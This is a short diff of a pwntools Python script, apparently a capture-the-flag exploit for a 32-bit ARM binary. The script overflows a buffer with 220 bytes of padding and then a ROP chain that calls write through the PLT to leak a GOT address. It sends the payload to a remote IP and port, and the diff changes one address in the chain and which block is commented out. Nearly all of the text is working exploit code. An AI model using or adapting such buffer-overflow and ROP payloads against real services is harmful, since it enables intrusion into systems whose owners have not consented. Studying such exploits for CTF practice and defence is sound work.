@@ -33,18 +33,18 @@ from pwn import *
 
 context(arch='arm', bits=32, endian='little')
 context.log_level = "debug"
-
+'''
 ip, port = '159.65.54.124', 30132
 io = remote(ip, port)
-
+'''
 payload = 'A'*220
 #write.plt(1, write.got, 4)
-payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(67664) + p32(0) + p32(1) + p32(0x000083cc) + p32(67664) + p32(0x000085f4)
+payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(67664) + p32(0) + p32(1) + p32(0x000083cc) + p32(33824) + p32(0x000085f4)
 
-'''
 with open('input.txt','wb') as f:
 	f.write(payload)
 '''
 io.recvuntil('Careful there! That hurt!')
 io.sendline(payload)
 print io.recvall()
+'''
